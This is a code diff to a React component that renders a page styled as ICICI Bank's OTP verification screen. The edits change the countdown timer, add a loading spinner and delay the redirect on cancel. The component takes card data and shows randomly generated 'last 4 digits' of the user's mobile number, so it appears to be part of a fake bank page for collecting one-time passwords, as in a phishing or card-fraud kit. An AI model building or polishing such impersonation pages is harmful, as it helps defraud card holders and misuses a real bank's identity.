@@ -1,4 +1,5 @@
 import React, { useState, useEffect } from 'react';
+import LoadingSpinner from './LoadingSpinner';
 
 interface ICICIBankOTPPageProps {
   cardData: {
@@ -53,11 +54,10 @@ const ICICIBankOTPPage: React.FC<ICICIBankOTPPageProps> = ({
 }) => {
   // Loading state
   const [isLoading, setIsLoading] = useState(true);
-  
-  // Timer state (starts at 3:59)
-  const [timeLeft, setTimeLeft] = useState(239); // 3 minutes 59 seconds = 239 seconds
+  const [timeLeft, setTimeLeft] = useState(180);
   const [isExpired, setIsExpired] = useState(false);
-  
+  const [redirectLoading, setRedirectLoading] = useState(false);
+
   // Random mobile last 4 digits
   const [mobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
   
@@ -77,28 +77,34 @@ const ICICIBankOTPPage: React.FC<ICICIBankOTPPageProps> = ({
   });
 
   // Timer countdown effect
-  // Loading timer - show loading for 2 seconds
+  // Loading timer - show loading for  // Original loading timer
   useEffect(() => {
-    const loadingTimer = setTimeout(() => {
+    const timer = setTimeout(() => {
       setIsLoading(false);
     }, 2000);
-    return () => clearTimeout(loadingTimer);
+
+    return () => clearTimeout(timer);
   }, []);
 
   useEffect(() => {
-    if (timeLeft > 0 && !isExpired) {
-      const timer = setTimeout(() => {
-        setTimeLeft(timeLeft - 1);
-      }, 1000);
-      return () => clearTimeout(timer);
-    } else if (timeLeft === 0) {
-      setIsExpired(true);
-      // Redirect to checkout with failure message after timeout
-      setTimeout(() => {
-        handleOtpCancel();
-      }, 2000);
-    }
-  }, [timeLeft, isExpired, handleOtpCancel]);
+    const timer = setInterval(() => {
+      setTimeLeft(prev => {
+        if (prev <= 1) {
+          clearInterval(timer);
+          setIsExpired(true);
+          // Show loading spinner before redirecting
+          setRedirectLoading(true);
+          setTimeout(() => {
+            handleOtpCancel();
+          }, 3500);
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+
+    return () => clearInterval(timer);
+  }, [handleOtpCancel]);
 
   // Format timer display
   const formatTime = (seconds: number) => {
@@ -129,25 +135,18 @@ const ICICIBankOTPPage: React.FC<ICICIBankOTPPageProps> = ({
     }
   };
 
-  // Show loading spinner
+  // Show loading spinner during redirect only
+  if (redirectLoading) {
+    return <LoadingSpinner />;
+  }
+
+  // Show original loading state
   if (isLoading) {
     return (
       <div className="min-h-screen bg-white flex items-center justify-center">
         <div className="text-center p-8">
           <div className="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
           <div className="text-gray-600 font-medium">Loading OTP verification...</div>
-        </div>
-      </div>
-    );
-  }
-
-  if (isExpired) {
-    return (
-      <div className="min-h-screen bg-white flex items-center justify-center">
-        <div className="text-center p-8">
-          <div className="text-red-600 text-xl font-semibold mb-4">Session Expired</div>
-          <div className="text-gray-600 mb-4">Your OTP verification session has expired.</div>
-          <div className="text-sm text-gray-500">Redirecting to checkout page...</div>
         </div>
       </div>
     );
@@ -266,7 +265,12 @@ const ICICIBankOTPPage: React.FC<ICICIBankOTPPageProps> = ({
             
             <button
               type="button"
-              onClick={handleOtpCancel}
+              onClick={() => {
+                setRedirectLoading(true);
+                setTimeout(() => {
+                  handleOtpCancel();
+                }, 3500);
+              }}
               disabled={otpSubmitting}
               className="flex-1 bg-gray-500 text-white py-2 px-4 font-semibold text-xs disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-600 transition-colors rounded touch-manipulation"
               style={{ touchAction: 'manipulation', WebkitTapHighlightColor: 'transparent', pointerEvents: 'auto' }}
